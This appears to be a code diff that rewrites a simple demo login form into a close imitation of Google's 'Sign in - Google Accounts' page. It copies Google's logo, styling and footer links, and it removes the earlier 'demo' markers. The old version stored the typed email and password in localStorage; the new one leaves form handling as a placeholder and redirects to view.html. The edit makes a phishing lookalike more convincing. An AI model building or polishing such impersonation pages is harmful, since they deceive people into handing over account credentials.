@@ -1,41 +1,169 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Chrome</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        .logo { width: 80px; margin-bottom: 15px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
-        button { background: #4285F4; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; }
-        .warning { color: red; font-size: 12px; margin-top: 20px; }
+        :root {
+            --blue: #4285F4;
+            --blue-dark: #3367D6;
+            --gray-light: #f8f9fa;
+            --gray-border: #dadce0;
+            --text-dark: #202124;
+            --text-light: #5f6368;
+        }
+        
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: var(--gray-light);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: var(--text-dark);
+        }
+        
+        header {
+            padding: 20px;
+            text-align: right;
+        }
+        
+        .login-container {
+            max-width: 450px;
+            margin: 40px auto;
+            width: 100%;
+            padding: 0 20px;
+        }
+        
+        .login-card {
+            background: white;
+            border: 1px solid var(--gray-border);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 75px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 15px 0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--gray-border);
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border-color: var(--blue);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(66,133,244,0.3);
+        }
+        
+        .btn {
+            width: 100%;
+            background: var(--blue);
+            color: white;
+            padding: 10px 0;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        
+        .btn:hover {
+            background: var(--blue-dark);
+        }
+        
+        .links {
+            margin-top: 30px;
+            font-size: 14px;
+        }
+        
+        .links a {
+            color: var(--blue);
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-light);
+            font-size: 12px;
+            margin-top: auto;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo" alt="Google">
-        <h3>Sign in</h3>
-        <p>To continue to Chrome</p>
-        
-        <form id="demoForm">
-            <input type="text" id="email" placeholder="Email or phone" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Next</button>
-        </form>
-
-        <p <u> class="warning">Forgot password? <u></p>
+    <header>
+        <a href="#" style="color: var(--text-light); text-decoration: none; font-size: 14px;">Help</a>
+    </header>
+    
+    <div class="login-container">
+        <div class="login-card">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo" alt="Google">
+            <h1>Sign in</h1>
+            <p style="color: var(--text-light); margin-bottom: 30px;">Use your Google Account</p>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email or phone" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="form-group">
+                    <button type="submit" class="btn">Next</button>
+                </div>
+            </form>
+            
+            <div class="links">
+                <a href="#">Forgot email?</a>
+                <a href="#">Create account</a>
+            </div>
+        </div>
     </div>
+    
+    <footer>
+        <div style="margin-bottom: 10px;">
+            <select style="padding: 5px; border: 1px solid var(--gray-border); border-radius: 4px;">
+                <option>English (United States)</option>
+            </select>
+        </div>
+        <div>
+            <a href="#" style="color: var(--text-light); margin: 0 10px; text-decoration: none;">Help</a>
+            <a href="#" style="color: var(--text-light); margin: 0 10px; text-decoration: none;">Privacy</a>
+            <a href="#" style="color: var(--text-light); margin: 0 10px; text-decoration: none;">Terms</a>
+        </div>
+    </footer>
 
     <script>
-        document.getElementById("demoForm").addEventListener("submit", function(e) {
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
-            
-            // Store fake data (for demo only)
-            localStorage.setItem("demo_email", document.getElementById("email").value);
-            localStorage.setItem("demo_password", document.getElementById("password").value);
-            
-            // Redirect to viewer
-            window.location.href = "view.html";
+            // Form handling would go here
+            window.location.href = 'view.html';
         });
     </script>
 </body>
